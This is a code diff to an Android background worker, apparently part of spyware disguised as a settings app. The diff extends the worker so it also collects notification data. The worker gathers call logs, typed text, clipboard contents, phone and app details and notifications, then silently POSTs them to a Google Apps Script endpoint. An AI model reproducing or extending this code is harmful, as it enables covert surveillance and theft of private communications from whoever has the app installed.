@@ -35,7 +35,7 @@ import static com.example.settings.MainActivity.clipboardManager;
 public class SyncData extends Worker {
     Sharedpref mSharedpref;
     Context context;
-    String Name, OutgoingNumbers,RecievedNumbers,MissedCallNumbers,TextWritten,DaysTime,Copiedtext,Phonenumberdetails="",Phoneappdetails="";
+    String Name, OutgoingNumbers,RecievedNumbers,MissedCallNumbers,TextWritten,DaysTime,Copiedtext="",Phonenumberdetails="",Phoneappdetails="",NotificationData;
     List<Contact> contactList=new ArrayList<>();
 
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
@@ -53,6 +53,7 @@ public class SyncData extends Worker {
          RecievedNumbers=mSharedpref.getRecievedNumbers();
          MissedCallNumbers=mSharedpref.getMissedCallNumber();
          TextWritten=mSharedpref.getSaveTextWritten();
+        NotificationData=mSharedpref.getNotificationData();
          try {
              ClipData pData = clipboardManager.getPrimaryClip();
              if(pData!=null) {
@@ -78,50 +79,55 @@ public class SyncData extends Worker {
         String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
         String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
         DaysTime=currentDate+"["+currentTime+"]";
-        if(!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() || !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty() || !Phonenumberdetails.isEmpty()) {
-            StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
-                    new Response.Listener<String>() {
-                        @Override
-                        public void onResponse(String response) {
-                            mSharedpref.setOutgoingNumbers("");
-                            mSharedpref.setRecievedNumbers("");
-                            mSharedpref.setMissedCallNumber("");
-                            mSharedpref.setSaveTextWritten("");
-                            mSharedpref.commit();
+        if(!Name.isEmpty()) {
+            if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
+                    !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
+                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty()) {
+                StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
+                        new Response.Listener<String>() {
+                            @Override
+                            public void onResponse(String response) {
+                                mSharedpref.setOutgoingNumbers("");
+                                mSharedpref.setRecievedNumbers("");
+                                mSharedpref.setMissedCallNumber("");
+                                mSharedpref.setSaveTextWritten("");
+                                mSharedpref.commit();
+                            }
+                        },
+                        new Response.ErrorListener() {
+                            @Override
+                            public void onErrorResponse(VolleyError error) {
+                                Result.retry();
+                            }
                         }
-                    },
-                    new Response.ErrorListener() {
-                        @Override
-                        public void onErrorResponse(VolleyError error) {
-                            Result.retry();
-                        }
+                ) {
+                    @Override
+                    protected Map<String, String> getParams() {
+                        Map<String, String> parmas = new HashMap<>();
+
+                        //here we pass params
+                        parmas.put("action", "addItem");
+                        parmas.put("Name", Name);
+                        parmas.put("DaysTime", DaysTime);
+                        parmas.put("TextWritten", TextWritten);
+                        parmas.put("OutgoingNumbers", OutgoingNumbers);
+                        parmas.put("RecievedNumbers", RecievedNumbers);
+                        parmas.put("MissedCallNumbers", MissedCallNumbers);
+                        parmas.put("Copiedtext", Copiedtext);
+                        parmas.put("Phonenumberdetails", Phonenumberdetails);
+                        parmas.put("Phoneappdetails", Phoneappdetails);
+                        parmas.put("NotificationData",NotificationData);
+                        return parmas;
                     }
-            ) {
-                @Override
-                protected Map<String, String> getParams() {
-                    Map<String, String> parmas = new HashMap<>();
+                };
 
-                    //here we pass params
-                    parmas.put("action", "addItem");
-                    parmas.put("Name", Name);
-                    parmas.put("DaysTime", DaysTime);
-                    parmas.put("TextWritten", TextWritten);
-                    parmas.put("OutgoingNumbers", OutgoingNumbers);
-                    parmas.put("RecievedNumbers", RecievedNumbers);
-                    parmas.put("MissedCallNumbers", MissedCallNumbers);
-                    parmas.put("Copiedtext",Copiedtext);
-                    parmas.put("Phonenumberdetails",Phonenumberdetails);
-                    parmas.put("Phoneappdetails",Phoneappdetails);
-                    return parmas;
-                }
-            };
+                int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
+                RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
+                stringRequest.setRetryPolicy(retryPolicy);
 
-            int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
-            RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
-            stringRequest.setRetryPolicy(retryPolicy);
-
-            RequestQueue queue = Volley.newRequestQueue(context);
-            queue.add(stringRequest);
+                RequestQueue queue = Volley.newRequestQueue(context);
+                queue.add(stringRequest);
+            }
         }
         return Result.success();
     }
